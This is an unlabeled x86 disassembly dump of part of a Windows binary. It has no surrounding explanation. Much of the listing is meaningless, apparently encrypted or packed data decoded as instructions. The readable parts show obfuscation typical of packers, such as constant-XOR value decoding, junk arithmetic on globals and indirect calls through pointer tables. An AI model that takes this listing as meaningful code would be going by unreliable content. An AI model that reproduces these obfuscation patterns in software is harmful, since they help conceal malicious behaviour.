  40522c:	lock hlt 
  40522e:	call   0x615e11db
  405233:	cmp    eax,0x232cc176
  405238:	fld    TBYTE PTR [ebp+eiz*8+0x1826632]
  40523f:	(bad)  
  405240:	pop    esi
  405241:	ins    BYTE PTR es:[edi],dx
  405242:	push   ss
  405243:	adc    al,0x45
  405245:	aas    
  405246:	pop    esp
  405247:	ins    BYTE PTR es:[edi],dx
  405248:	pop    edi
  405249:	push   cs
  40524a:	add    eax,0xb946377d
  40524f:	push   esp
  405250:	or     BYTE PTR [ecx+0x7],dl
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	add    al,0x21
  40527e:	and    al,0x77
  405280:	(bad)  
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x4052dc
  405289:	inc    edx
  40528a:	and    esp,esp
  40528c:	in     al,dx
  40528d:	vandps ymm7,ymm6,YMMWORD PTR [ebx+0x60e234ea]
  405295:	push   ss
  405296:	repnz mov ch,0xf
  405299:	test   BYTE PTR [ecx+eax*4],dh
  40529c:	aaa    
  40529d:	xor    ecx,DWORD PTR [edx]
  40529f:	xor    ebx,DWORD PTR [ecx+eiz*1+0x125c6f01]
  4052a6:	add    edi,ebp
  4052a8:	jge    0x40530c
  4052aa:	push   0x6368637f
  4052af:	stos   DWORD PTR es:[edi],eax
  4052b0:	rcl    bh,1
  4052b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052b3:	mov    ah,BYTE PTR ds:[esi-0x7d]
  4052b7:	ficom  DWORD PTR [ecx+0x45]
  4052ba:	xchg   edi,eax
  4052bb:	in     al,0x47
  4052bd:	inc    ebx
  4052be:	xchg   esi,eax
  4052bf:	push   0xffffffe0
  4052c1:	rcl    esi,0xe3
  4052c4:	jg     0x405330
  4052c6:	xchg   esi,eax
  4052c7:	(bad)  
  4052c8:	call   0x43fe2172
  4052cd:	test   al,0x6e
  4052cf:	sub    BYTE PTR [eax+ebx*2],bh
  4052d2:	push   ss
  4052d3:	xchg   ebp,eax
  4052d4:	retf   0xf148
  4052d7:	test   ebx,ebp
  4052d9:	cs jns 0x405329
  4052dc:	push   0xffffff8c
  4052de:	dec    edx
  4052df:	and    al,0xb4
  4052e1:	gs cdq 
  4052e3:	hlt    
  4052e4:	shl    BYTE PTR [ebx+0x1f],0x85
  4052e8:	and    dl,dl
  4052ea:	push   esp
  4052eb:	test   edi,eax
  4052ed:	jno    0x405329
  4052ef:	mov    ah,0x40
  4052f1:	jmp    0xdbc7:0x579dcee1
  4052f8:	jnp    0x4052ca
  4052fa:	or     BYTE PTR [ebx+0x4b],bl
  4052fd:	lock inc edx
  4052ff:	pop    eax
  405300:	mul    edx
  405302:	dec    ecx
  405303:	push   esp
  405304:	out    dx,eax
  405305:	mov    esp,?
  405307:	rol    BYTE PTR [ebx+ebp*1],0xc0
  40530b:	iret   
  40530c:	aam    0x26
  40530e:	push   ds
  40530f:	je     0x4052f0
  405311:	repz cmp al,0xc7
  405314:	fistp  WORD PTR [esi+eax*8-0x50535e3b]
  40531b:	xor    al,0x45
  40531d:	in     al,dx
  40531e:	loopne 0x4052b5
  405320:	xor    ecx,DWORD PTR [eax+0x271ad058]
  405326:	sub    al,0x57
  405328:	adc    ah,BYTE PTR ds:0x41a3d456
  40532e:	fistp  DWORD PTR [ebx+0x507267f1]
  405334:	mov    edi,0xe663d5c1
  405339:	jg     0x405311
  40533b:	(bad)  
  40533c:	fist   DWORD PTR [edx+ebp*8+0x7b]
  405340:	retf   
  405341:	cmp    eax,0xefd7dbaf
  405346:	dec    eax
  405347:	aam    0xf6
  405349:	es jle 0x405392
  40534c:	mov    BYTE PTR [esi-0x2a],cl
  40534f:	pop    ecx
  405350:	in     eax,dx
  405351:	std    
  405352:	cmp    eax,0x92454850
  405357:	and    DWORD PTR [edi+0x5b],esp
  40535a:	lahf   
  40535b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40535c:	aad    0x8
  40535e:	arpl   si,bx
  405360:	dec    ebx
  405361:	pop    esi
  405362:	mov    bl,0x7e
  405364:	add    bl,BYTE PTR [eax+0x5722dcbb]
  40536a:	mov    ds:0x1ef144ca,al
  40536f:	sbb    BYTE PTR [bp+di-0x544c],bh
  405374:	stos   DWORD PTR es:[edi],eax
  405375:	or     eax,0x5bbb4d68
  40537a:	dec    edx
  40537b:	out    dx,eax
  40537c:	arpl   WORD PTR [edi+0x4a],di
  40537f:	jmp    0x4053ae
  405381:	lock or al,ch
  405384:	mov    DWORD PTR [eax+eax*2+0x44],0x7e83c72b
  40538c:	loop   0x40531d
  40538e:	test   al,0xed
  405390:	inc    edx
  405391:	aad    0xe
  405393:	xchg   DWORD PTR [ebx-0x5c494537],edx
  405399:	and    edx,0xfae00844
  40539f:	xchg   ebx,eax
  4053a0:	out    dx,eax
  4053a1:	repnz pop ecx
  4053a3:	jmp    0xde42f95d
  4053a8:	push   ebp
  4053a9:	call   FWORD PTR [ebx]
  4053ab:	push   ss
  4053ac:	sbb    ecx,DWORD PTR [ebx]
  4053ae:	mov    cs,ebp
  4053b0:	xchg   ah,bl
  4053b2:	pop    esi
  4053b3:	rcl    dl,0x43
  4053b6:	lods   al,BYTE PTR ds:[esi]
  4053b7:	and    al,BYTE PTR [ecx-0x76d8092a]
  4053bd:	or     al,0x95
  4053bf:	sub    BYTE PTR [ebx],ch
  4053c1:	imul   esi,DWORD PTR [ecx],0xffffff83
  4053c4:	push   edi
  4053c5:	outs   dx,BYTE PTR ds:[esi]
  4053c6:	xchg   ebp,eax
  4053c7:	dec    dx
  4053c9:	jmp    0x8c8e:0xfcedbf9b
  4053d0:	push   ebp
  4053d1:	jb     0x40544b
  4053d3:	and    DWORD PTR [edx-0x23],esp
  4053d6:	push   0xaa667d85
  4053db:	out    dx,eax
  4053dc:	add    DWORD PTR [ebx-0x1f],esp
  4053df:	shl    BYTE PTR [ecx+esi*8+0x56],1
  4053e3:	imul   BYTE PTR [eax-0x70]
  4053e6:	sbb    ebx,edi
  4053e8:	and    esp,DWORD PTR [edx+ebp*4-0x2f250887]
  4053ef:	cwde   
  4053f0:	pop    ebp
  4053f1:	add    bh,BYTE PTR [eax]
  4053f3:	mov    dh,0xf9
  4053f5:	ss loop 0x40537c
  4053f8:	data16 sub BYTE PTR [ebx+0x5a],0xcd
  4053fd:	push   ds
  4053fe:	lds    ebx,FWORD PTR [edx+0x6ee2ba36]
  405404:	sti    
  405405:	cdq    
  405406:	adc    eax,0xf49e32ec
  40540b:	dec    eax
  40540c:	into   
  40540d:	inc    ebx
  40540e:	or     BYTE PTR [esi+0x6b66761b],dh
  405414:	jg     0x405430
  405416:	clc    
  405417:	add    cl,dl
  405419:	push   edx
  40541a:	inc    ebp
  40541b:	adc    BYTE PTR [ecx-0x10],dl
  40541e:	jg     0x4053ad
  405420:	mov    bl,0xee
  405422:	aaa    
  405423:	(bad)  
  405424:	dec    edi
  405425:	pushf  
  405426:	lea    ebx,[ecx-0x19]
  405429:	sub    eax,0xa0ff86c1
  40542e:	comiss xmm6,xmm1
  405431:	pop    ss
  405432:	test   eax,0x8aeef655
  405437:	add    eax,0x9a1c8c20
  40543c:	mov    al,0x25
  40543e:	push   edi
  40543f:	push   edi
  405440:	(bad)  
  405442:	std    
  405443:	les    esp,FWORD PTR [eax-0xb993eaf]
  405449:	repz mov ch,0x16
  40544c:	and    eax,0xa09d2cb8
  405451:	and    ebp,edx
  405453:	inc    ecx
  405454:	ret    0xabc0
  405457:	cmp    edx,DWORD PTR [edx+ebx*1+0x3c]
  40545b:	cmp    ebx,ecx
  40545d:	rol    BYTE PTR ss:[ebx+0x63bdea5e],cl
  405464:	shl    edi,0xab
  405467:	(bad)  
  405469:	jp     0x4054b2
  40546b:	aas    
  40546c:	adc    eax,0x970f5781
  405471:	jecxz  0x405420
  405473:	sub    bl,ch
  405475:	mov    eax,ds:0x4289a13c
  40547a:	or     BYTE PTR [ebx+0x558b1c45],cl
  405480:	adc    BYTE PTR [ecx+0x458b0c42],cl
  405486:	and    BYTE PTR [ebx+0x42891055],cl
  40548c:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x4303df
  4054d4:	sbb    DWORD PTR ds:0x430345,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x430371,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x430355,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x4303e3,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x430355,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x430355
  40552a:	inc    eax
  40552b:	mov    ds:0x430355,eax
  405530:	cmp    DWORD PTR ds:0x430355,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x430355,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42eb17
  405555:	cmp    DWORD PTR ds:0x430355,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x430355
  405567:	inc    eax
  405568:	mov    ds:0x430355,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x430371,0x14
  40557c:	cmp    DWORD PTR ds:0x430371,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x430371,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42e9a3
  4055a2:	cmp    DWORD PTR ds:0x430371,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x430371
  4055b7:	dec    eax
  4055b8:	mov    ds:0x430371,eax
  4055bd:	mov    eax,ds:0x430371
  4055c2:	dec    eax
  4055c3:	mov    ds:0x430371,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ecd3,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0xd8a2c60a
  4055e5:	sahf   
  4055e6:	(bad)  
  4055e7:	cld    
  4055e8:	sub    bh,BYTE PTR ss:[esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x405571
  4055f1:	mov    ch,0x13
  4055f3:	adc    BYTE PTR [ecx],dh
  4055f5:	fidivr DWORD PTR [edi]
  4055f7:	xor    DWORD PTR [edi+edi*2+0x52b28c91],eax
  4055fe:	pushf  
  4055ff:	mov    dh,0x11
  405601:	pusha  
  405602:	hlt    
  405603:	pop    ebp
  405604:	repnz push cs
  405606:	outs   dx,BYTE PTR ds:[esi]
  405607:	aad    0x63
  405609:	arpl   WORD PTR [ecx+ebp*4-0x1993bbe7],bp
  405610:	aam    0x4c
  405612:	xlat   BYTE PTR ds:[ebx]
  405613:	out    dx,eax
  405614:	mov    bh,0x61
  405616:	(bad)  
  405617:	jecxz  0x405620
  405619:	test   al,0x54
  40561b:	mov    dh,0x77
  40561d:	into   
  40561e:	dec    esi
  40561f:	das    
  405620:	mov    ah,0x32
  405622:	mov    eax,0x8970e32d
  405627:	add    dl,0xc9
  40562a:	xor    DWORD PTR [ecx-0x5acfa6cf],eax
  405630:	or     edx,DWORD PTR [eax+0x78a9b0d1]
  405636:	ffree  st(7)
  405638:	pop    ecx
  405639:	add    bh,BYTE PTR [ecx]
  40563b:	aaa    
  40563c:	in     eax,dx
  40563d:	shl    esp,1
  40563f:	push   ebx
  405640:	jecxz  0x405649
  405642:	add    edx,ebx
  405644:	cli    
  405645:	lods   eax,DWORD PTR ds:[esi]
  405646:	es inc esp
  405648:	cmc    
  405649:	adc    eax,0xf58abedb
  40564f:	pop    edi
  405650:	or     al,0x5b
  405652:	loope  0x405605
  405654:	or     al,0xd8
  405656:	clc    
  405657:	cmp    DWORD PTR [ebx+0x3b],edx
  40565a:	jp     0x40564a
  40565c:	sbb    DWORD PTR [ebx],edi
  40565e:	fild   QWORD PTR [eax]
  405660:	in     eax,0xe2
  405662:	sar    ch,0x6
  405665:	mov    edi,0x6f226c46
  40566a:	mov    ah,BYTE PTR [eax-0x69]
  40566d:	xor    edi,esi
  40566f:	or     al,0xe0
  405671:	mov    al,0x7
  405673:	imul   DWORD PTR [ecx+0xbc4fbb4]
  405679:	fs jle 0x405685
  40567c:	cmp    ebp,DWORD PTR [edi-0x2437ea52]
  405682:	lods   al,BYTE PTR ds:[esi]
  405683:	sbb    bl,ah
  405685:	xchg   ch,dl
  405687:	inc    esp
  405688:	xchg   BYTE PTR [ebx],dl
  40568a:	imul   edi,eax,0x840d3632
  405690:	jecxz  0x40568d
  405692:	adc    BYTE PTR [ebp-0x57],0x8b
  405696:	inc    ecx
  405697:	jae    0x40567b
  405699:	adc    al,0x83
  40569b:	ss mov ah,0x3b
  40569e:	stos   DWORD PTR es:[edi],eax
  40569f:	retf   0x3838
  4056a2:	and    DWORD PTR [ecx+0x1e],0x682be3ce
  4056a9:	jp     0x4056d3
  4056ab:	jae    0x405717
  4056ad:	cld    
  4056ae:	mov    dl,0x32
  4056b0:	adc    cl,BYTE PTR [ebx-0x63]
  4056b3:	pop    edx
  4056b4:	push   ebx
  4056b5:	call   DWORD PTR [ecx]
  4056b7:	dec    BYTE PTR [edx]
  4056b9:	dec    ebx
  4056ba:	inc    ebx
  4056bb:	jle    0x40570e
  4056bd:	daa    
  4056be:	mov    bl,0xb
  4056c0:	pop    ebp
  4056c1:	xlat   BYTE PTR ds:[ebx]
  4056c2:	pop    esi
  4056c3:	jb     0x4056cc
  4056c5:	mov    dl,0x21
  4056c7:	test   eax,0x5e93b327
  4056cc:	iret   
  4056cd:	mov    eax,0x2be39ca0
  4056d2:	dec    esp
  4056d3:	dec    edi
  4056d4:	mov    ds:0x630c892e,al
  4056d9:	or     al,0x17
  4056db:	fwait
  4056dc:	cmp    ebp,edx
  4056de:	loop   0x4056bb
  4056e0:	leave  
  4056e1:	and    BYTE PTR [edi],al
  4056e3:	jmp    0x40572f
  4056e5:	xor    BYTE PTR ss:[eax],ch
  4056e8:	add    dh,BYTE PTR [ebp+esi*1+0x51b9a13b]
  4056ef:	lock rcl DWORD PTR [eax-0x7fd1a44e],1
  4056f6:	cmc    
  4056f7:	out    dx,eax
  4056f8:	mov    ebp,edi
  4056fa:	sub    cl,0xcd
  4056fd:	pop    edi
  4056fe:	xor    BYTE PTR [ebp-0x5b4954f3],al
  405704:	pop    edi
  405705:	lods   al,BYTE PTR ds:[esi]
  405706:	pop    esp
  405707:	pop    es
  405708:	dec    edx
  405709:	mov    al,ds:0x9aed504
  40570e:	aaa    
  40570f:	xor    BYTE PTR [edi+0x50d75c2f],ah
  405715:	into   
  405716:	xor    al,0x96
  405718:	ret    0x874c
  40571b:	ror    ch,1
  40571d:	add    cl,al
  40571f:	push   ds
  405720:	mov    bl,0x7a
  405722:	xor    bh,ch
  405724:	jl     0x4056fe
  405726:	mov    bl,BYTE PTR [esi]
  405728:	jnp    0x405711
  40572a:	fisttp DWORD PTR es:[ecx-0x90f4ab3]
  405731:	in     eax,0xd7
  405733:	mov    eax,ds:0x15e86de9
  405738:	fstp   DWORD PTR [ecx]
  40573a:	ret    0x7d5e
  40573d:	data16 das 
  40573f:	push   edi
  405740:	push   cs
  405741:	xlat   BYTE PTR ds:[ebx]
  405742:	cmp    ebx,ebp
  405744:	dec    esp
  405745:	jbe    0x4057aa
  405747:	push   0x1b063f84
  40574c:	fsub   QWORD PTR [ecx+0x4]
  40574f:	sub    eax,0xe3af15c3
  405754:	stos   DWORD PTR es:[edi],eax
  405755:	jmp    0xf0ab:0xfdf81b0d
  40575c:	mov    bl,ch
  40575e:	inc    esp
  40575f:	sbb    DWORD PTR [edi-0x31afd042],edi
  405765:	pop    ds
  405766:	sub    DWORD PTR [esi],ebp
  405768:	scas   al,BYTE PTR es:[edi]
  405769:	jmp    0x4057e8
  40576b:	(bad)  
  40576c:	xor    al,0x2e
  40576e:	jmp    0xe0e6:0xde9c581a
  405775:	out    dx,al
  405776:	and    al,0x8a
  405778:	clc    
  405779:	add    eax,ebp
  40577b:	pop    esi
  40577c:	ret    
  40577d:	gs push esi
  40577f:	adc    BYTE PTR [esi-0x4bf26a84],dh
  405785:	xor    cl,cl
  405787:	inc    edx
  405788:	mov    BYTE PTR [esi+edi*4+0x1622a5a3],dl
  40578f:	pop    edi
  405790:	ins    BYTE PTR es:[edi],dx
  405791:	outs   dx,BYTE PTR ds:[esi]
  405792:	mov    edx,0x1f4b69a7
  405797:	out    0xc8,al
  405799:	xor    DWORD PTR [edx+0x68],edi
  40579c:	ja     0x4057ad
  40579e:	fpatan 
  4057a0:	dec    ebp
  4057a1:	retf   
  4057a2:	and    bl,ah
  4057a4:	out    dx,al
  4057a5:	test   al,0x3f
  4057a7:	enter  0x7462,0x5
  4057ab:	jae    0x405741
  4057ad:	into   
  4057ae:	adc    DWORD PTR ds:0x442ef9c6,ebx
  4057b4:	adc    BYTE PTR [eax+0x2a5984f],0xc3
  4057bb:	or     al,0x49
  4057bd:	stos   BYTE PTR es:[edi],al
  4057be:	or     DWORD PTR [eax+0x47b6a2a5],esi
  4057c4:	les    ecx,FWORD PTR [ebx+0x16]
  4057c7:	stos   BYTE PTR es:[edi],al
  4057c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057c9:	mov    al,ds:0xcc45c7d0
  4057ce:	xor    DWORD PTR ds:0x5c7f89f,eax
  4057d4:	fucomi st,st(4)
  4057d6:	inc    edx
  4057d7:	add    BYTE PTR [edx],bl
  4057d9:	add    BYTE PTR [eax],al
  4057db:	add    BYTE PTR [ebx+0x42ecdb3d],al
  4057e1:	add    BYTE PTR [eax],al
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ecdb,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e8d7
  4057ff:	mov    eax,ds:0x42ecdb
  405804:	dec    eax
  405805:	mov    ds:0x42ecdb,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e6c8
  40581d:	or     DWORD PTR ds:0x430345,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x430339,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e6d4,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ecef
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ecdb,0x1c
  405863:	cmp    DWORD PTR ds:0x42ecdb,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ecdb,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e8db
  405886:	cmp    DWORD PTR ds:0x42ecdb,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ecdb
  405898:	dec    eax
  405899:	mov    ds:0x42ecdb,eax
  40589e:	mov    eax,ds:0x42ecdb
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ecdb,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x430341,0x42ecd3
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x430335,0x42e6c4
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x4303d3,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x43035d
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x43033d
  4058ec:	xor    DWORD PTR ds:0x430361,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x430351,0x42ecef
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x430341,0x42e6c8
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x430341
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ecd3,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42eceb
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x430369,0x4303eb
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x430369,0x42e6c8
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x4303d3
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x4303d3,0x42e6d4
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x43033d,0x42ecdb
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42eccf,0x42eceb
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x430355
  405986:	sbb    eax,DWORD PTR ds:0x43036d
  40598c:	mov    ds:0x430355,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	or     esp,DWORD PTR [ebx]
  4059a4:	or     DWORD PTR [edi+0x7e7e280d],ecx
  4059aa:	push   ebp
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x40594b
  4059af:	loope  0x4059a2
  4059b1:	and    BYTE PTR [ecx],ch
  4059b3:	xchg   ebp,eax
  4059b4:	stos   DWORD PTR es:[di],eax
  4059b6:	inc    ecx
  4059b7:	jmp    0x91d7c0f2
  4059bc:	push   ss
  4059bd:	das    
  4059be:	leave  
  4059bf:	add    ch,BYTE PTR [ebx+0x27]
  4059c2:	repnz dec edi
  4059c4:	mov    eax,0x11f4531
  4059c9:	and    edi,eax
  4059cb:	xchg   edx,eax
  4059cc:	xlat   BYTE PTR ds:[ebx]
  4059cd:	out    0x5f,eax
  4059cf:	lods   al,BYTE PTR ds:[esi]
  4059d0:	inc    edx
  4059d1:	sbb    al,0xec
  4059d3:	sbb    BYTE PTR [ecx+0x1e7a143a],bh
  4059d9:	dec    esi
  4059da:	add    ebp,DWORD PTR [edx-0x5f7e2d6b]
  4059e0:	clc    
  4059e1:	out    0x7c,al
  4059e3:	fcmove st,st(5)
  4059e5:	mov    bl,0x5b
  4059e7:	sbb    BYTE PTR [edi],dl
  4059e9:	dec    ecx
  4059ea:	cs cdq 
  4059ec:	sbb    dl,dl
  4059ee:	jmp    0x329e:0x5feeb218
  4059f5:	dec    esi
  4059f6:	and    ecx,DWORD PTR [ebx-0x69ed4d51]
  4059fc:	mov    bl,0xcf
  4059fe:	inc    eax
  4059ff:	mov    ds:0xbd59d4b5,eax
  405a04:	sbb    DWORD PTR [ecx+0x55],edi
  405a07:	jmp    0x46fb:0xa2005089
  405a0e:	mov    ds:0x7328ee1a,eax
  405a13:	and    eax,0x7dca705
  405a18:	push   edi
  405a19:	sbb    eax,0x517d31f3
  405a1e:	jg     0x405a16
  405a20:	mov    DWORD PTR [edx-0x64],ebp
  405a23:	jne    0x4059c6
  405a25:	inc    edi
  405a26:	xor    BYTE PTR [edi-0x7bc3437d],dh
  405a2c:	mov    ch,0x66
  405a2e:	dec    edi
  405a2f:	aad    0x77
  405a31:	pop    esi
  405a32:	inc    ecx
  405a33:	jne    0x584b2c8
  405a39:	je     0x405a08
  405a3b:	ror    BYTE PTR [edx],0x54
  405a3e:	jo     0x405a5f
  405a40:	cld    
  405a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a42:	jmp    0x7695b80c
  405a47:	mov    ecx,ebp
  405a49:	add    DWORD PTR [esi+0x51],esi
  405a4c:	pop    eax
  405a4d:	xchg   ecx,eax
  405a4e:	(bad)  
  405a4f:	sbb    DWORD PTR [esi+0x48a5bb81],edx
  405a55:	fcmovnbe st,st(7)
  405a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a58:	scas   eax,DWORD PTR es:[edi]
  405a59:	mov    eax,ds:0xd892c1c0
  405a5e:	mov    dl,BYTE PTR [ebp+0x79]
  405a61:	in     al,0xbd
  405a63:	push   ds
  405a64:	jmp    0x3e940ef7
  405a69:	or     al,0xd1
  405a6b:	or     eax,DWORD PTR [esi+0x54]
  405a6e:	xor    DWORD PTR [edi+esi*1-0x688a0d76],esp
  405a75:	ds hlt 
  405a77:	clc    
  405a78:	xchg   ebp,eax
  405a79:	add    ebp,ebx
  405a7b:	add    cl,BYTE PTR [ecx-0x7982dc3e]
  405a81:	call   0xd794:0xfca9a23a
  405a88:	cmp    ebp,0x34234709
  405a8e:	jp     0x405aec
  405a90:	(bad)  [eax]
  405a92:	cmp    al,0x26
  405a94:	pop    edx
  405a95:	cld    
  405a96:	call   0xd2654678
  405a9b:	jmp    0xf4f1db19
  405aa0:	mov    BYTE PTR ds:0x18aca40,bh
  405aa6:	jbe    0x405aee
  405aa8:	enter  0x66cb,0x2
  405aac:	fimul  WORD PTR [ebp-0x73e080cb]
  405ab2:	out    dx,eax
  405ab3:	add    al,0x93
  405ab5:	(bad)  
  405ab6:	jae    0x405a54
  405ab8:	xor    al,0xaa
  405aba:	push   ecx
  405abb:	scas   al,BYTE PTR es:[edi]
  405abc:	scas   al,BYTE PTR es:[edi]
  405abd:	mov    dl,0x7d
  405abf:	dec    eax
  405ac0:	jno    0x405a59
  405ac2:	mov    ds:0x33ed332,eax
  405ac7:	lahf   
  405ac8:	mov    ebx,ss
  405aca:	pop    ecx
  405acb:	xor    al,0x53
  405acd:	aaa    
  405ace:	pop    edi
  405acf:	mov    eax,ds:0xb787c64d
  405ad4:	inc    eax
  405ad5:	sbb    al,0x3
  405ad7:	push   esp
  405ad8:	repz aad 0xf5
  405adb:	xchg   BYTE PTR [ebx],cl
  405add:	sbb    BYTE PTR [esp+ebp*8],bh
  405ae0:	(bad)  
  405ae1:	jmp    0x202e:0xbb75b6f7
  405ae8:	loop   0x405b56
  405aea:	mov    DWORD PTR [ecx],ecx
  405aec:	fmul   DWORD PTR [ebp+0x40]
  405aef:	in     eax,dx
  405af0:	xor    ebx,esp
  405af2:	stos   BYTE PTR es:[edi],al
  405af3:	pop    ebp
  405af4:	and    ebp,DWORD PTR [edx+esi*1]
  405af7:	push   ds
  405af8:	xlat   BYTE PTR ds:[ebx]
  405af9:	pop    esp
  405afa:	in     al,0x65
  405afc:	fdiv   st(0),st
  405afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aff:	pop    ecx
  405b00:	test   BYTE PTR [edx-0x7b],bh
  405b03:	nop
  405b04:	out    0x4f,eax
  405b06:	fst    QWORD PTR fs:[edx-0x17c4e2f0]
  405b0d:	push   edx
  405b0e:	or     al,0x14
  405b10:	jecxz  0x405b51
  405b12:	cmp    al,0xb0
  405b14:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b16:	fdiv   DWORD PTR [ecx+0x49]
  405b19:	inc    edx
  405b1a:	cmp    BYTE PTR [edi],dh
  405b1c:	xlat   BYTE PTR ds:[ebx]
  405b1d:	ret    0xd81d
  405b20:	xchg   ecx,eax
  405b21:	jl     0x405b68
  405b23:	(bad)  
  405b24:	cli    
  405b25:	or     DWORD PTR [ecx],edi
  405b27:	mov    ecx,0x939f1290
  405b2c:	xchg   edi,eax
  405b2d:	ret    
